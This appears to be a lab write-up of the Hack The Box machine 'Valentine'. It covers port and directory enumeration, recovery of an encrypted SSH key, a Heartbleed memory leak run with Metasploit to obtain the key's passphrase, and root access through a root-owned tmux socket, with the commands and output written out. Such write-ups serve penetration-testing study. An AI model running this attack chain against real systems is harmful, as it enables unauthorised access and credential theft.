---
layout: post
title: "valentine"
date: 2025-09-04 
categories: OSCP Playlist
---
# valentine

## Summary:

- Fuzzed for subdir, found RSA key
- nmap —script vuln scan found heartbleed vuln
- exploited heartbleed to find ssh login password
- history file revealed tmux session ran as root
- connected to root tmux session

First let’s enumerate the open ports and services:

```bash
sudo nmap -sC -sV 10.10.10.79 -oN nmap/valentine

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_ssl-date: 2025-09-04T09:36:44+00:00; +1s from scanner time.
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We see the domain name, let’s add that to /etc/hosts file:

```bash
10.10.10.79 valentine.htb
```

Let’s visit the webpage:

![image.png]({{ site.baseurl }}/assets/valentine/image.png)

Both http and https returned the same image. Page source is:

```bash
<center><img src="omg.jpg"/></center>
```

Let’s fuzz for subdir then subdomains:

```bash
feroxbuster -u http://valentine.htb

301      GET        9l       28w      312c http://valentine.htb/dev => http://valentine.htb/dev/
200      GET        2l     1794w     5383c http://valentine.htb/dev/hype_key
200      GET        8l       39w      227c http://valentine.htb/dev/notes.txt
200      GET        1l        2w       38c http://valentine.htb/index
200      GET      620l     3539w   275344c http://valentine.htb/omg.jpg
200      GET        1l        2w       38c http://valentine.htb/
200      GET       25l       54w      552c http://valentine.htb/decode.php
200      GET       27l       54w      554c http://valentine.htb/encode

```

In /dev/notes.txt:

```bash
To do:

1) Coffee.
2) Research.
3) Fix decoder/encoder before going live.
4) Make sure encoding/decoding is only done client-side.
5) Don't use the decoder/encoder until any of this is done.
6) Find a better way to take notes.
```

We also find a encoder and decoder:

encoder:

![image.png]({{ site.baseurl }}/assets/valentine/image%201.png)

decoder:

![image.png]({{ site.baseurl }}/assets/valentine/image%202.png)

We also find a page with a potentially encrypted key, let’s copy and save that to a file

![image.png]({{ site.baseurl }}/assets/valentine/image%203.png)

Both HTTP and HTTPS fuzzing returned the same subdir. Let’s also fuzz for subdomains:

```bash
ffuf -u http://10.10.10.79 -H "Host: FUZZ.valentine.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 38
```

Nothing.

The encoding function seem to be doing base64 encoding:

![image.png]({{ site.baseurl }}/assets/valentine/image%204.png)

Decoding is base64 decode:

![image.png]({{ site.baseurl }}/assets/valentine/image%205.png)

The hype_key looks like hexadecimal. Let’s use hex to ascii online and convert it:

```bash
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----
```

We get a RSA key. Let’s save that to a file.

```bash
chmod 600 hype.key 
```

At this point, let’s attempt to ssh; the default naming convention of a user and their key is user_key, let’s assume the user is hype

```bash
ssh -i hype.key hype@10.10.10.79
```

Needed passcode.

Let’s scan use nmap —script vuln to scan for vulnerabilities:

```bash
sudo nmap --script vuln 10.10.10.79

| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       http://cvedetails.com/cve/2014-0160/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
|_      http://www.openssl.org/news/secadv_20140407.txt 
```

Seems to be vulnerable to heartbleed. Let’s search up exploit:

```bash
msfconsole
search heartbleed
   4  auxiliary/scanner/ssl/openssl_heartbleed                2014-04-07       normal  Yes    OpenSSL Heartbeat (Heartbleed) Information Leak
   5    \_ action: DUMP                                       .                .       .      Dump memory contents to loot
use 5

set RHOSTS 10.10.10.79
run

[+] 10.10.10.79:443       - Heartbeat response with leak, 65535 bytes
[+] 10.10.10.79:443       - Heartbeat data stored in /home/kali/.msf4/loot/20250904112649_default_10.10.10.79_openssl.heartble_029517.bin
[*] 10.10.10.79:443       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Let’s attempt to view the data:

```bash
cp /home/kali/.msf4/loot/20250904112649_default_10.10.10.79_openssl.heartble_029517.bin hb_dump.bin
file hb_dump.bin

hb_dump.bin: data
```

Let’s use strings to try and extract meaningful text:

```bash
strings hb_dump.bin

#Interesting findings:
valentine.htb1                                                                                                                                   
valentine.htb0                                                                                                                                   
180206004525Z                                                                                                                                    
190206004525Z0J1                                                                                                                                 
valentine.htb1                                                                                                                                   
valentine.htb0

valentine.htb1
valentine.htb0
180206004525Z
190206004525Z0J1
valentine.htb1
valentine.htb0

b9597dc55b21a2759b480fb102f9999a
```

Dumping it a few time, we find this whiles looking in the file with less:

```bash
less /home/kali/.msf4/loot/20250904114206_default_10.10.10.79_openssl.heartble_443214.bin

Referer: https://127.0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==
```

Let’s decode this using their decoder:

```bash
Your input:

aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==

Your encoded input:

heartbleedbelievethehype
```

Let’s try ssh again.

```bash
ssh -i hype.key hype@10.10.10.79

#version mismatch
#try;
ssh -i hype.key -o PubkeyAcceptedKeyTypes=+ssh-rsa hype@10.10.10.79
```

Let’s check whether we are part of any privileged groups:

```bash

id

uid=1000(hype) gid=1000(hype) groups=1000(hype),24(cdrom),30(dip),46(plugdev),124(sambashare)
```

Let’s look at their history file:

```bash
cat .bash_history 

exit
exot
exit
ls -la
cd /
ls -la
cd .devs
ls -la
tmux -L dev_sess 
tmux a -t dev_sess 
tmux --help
tmux -S /.devs/dev_sess 
exit

```

Here's what each of these tmux commands does:

**1. `tmux -L dev_sess`**

- Creates a new tmux session using a custom socket named "dev_sess"
- The `L` flag specifies a socket name (stores session info in `~/.tmux-dev_sess` instead of default location)
- Useful for isolating sessions from your default tmux sessions

**2. `tmux a -t dev_sess`**

- Attaches to an existing tmux session named "dev_sess"
- `a` is short for `attach-session`
- `t` specifies the target session name
- Will fail if no session named "dev_sess" exists

**3. `tmux --help`**

- Displays tmux help information
- Shows available commands, options, and basic usage
- Standard help flag for getting documentation

**4. `tmux -S /.devs/dev_sess`**

- Creates/connects to a tmux session using a custom socket file at the specific path `/.devs/dev_sess`
- `S` specifies an exact socket file path (unlike `L` which uses a name)
- The socket file will be created at that exact location
- Note: This path starts with `/.devs/` which would be in the root directory - make sure that directory exists and you have permissions

**Key difference:** `-L` uses a socket name (tmux manages the path), while `-S` uses an exact socket file path that you specify.

Let’s check logged in users:

```bash
w

USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
hype     pts/0    10.10.16.7       03:52    1.00s  0.21s  0.00s w

```

We are the only one.

Trying the tmux commands also resulted in nothing.

Let’s look at the running processes:

```bash
ps -ef --forest

#interesting findings:
root       1026      1  0 02:35 tty4     00:00:00 /sbin/getty -8 38400 tty4
root       1035      1  0 02:35 tty5     00:00:00 /sbin/getty -8 38400 tty5
root       1037      1  0 02:35 ?        00:00:01 /usr/bin/tmux -S /.devs/dev_sess
```

Let’s go to the .devs dir:

```bash
ls -la 

srw-rw----  1 root hype    0 Sep  4 02:35 dev_sess
```

Let’s use the session:

```bash
tmux -S /.devs/dev_sess 

open terminal failed: missing or unsuitable terminal: tmux-256color
```

The remote machines does not have our local terminal type. Let’s just use a common terminal type:

```bash
export TERM=xterm
tmux -S /.devs/dev_sess
```

We now have root.

![image.png]({{ site.baseurl }}/assets/valentine/image%206.png)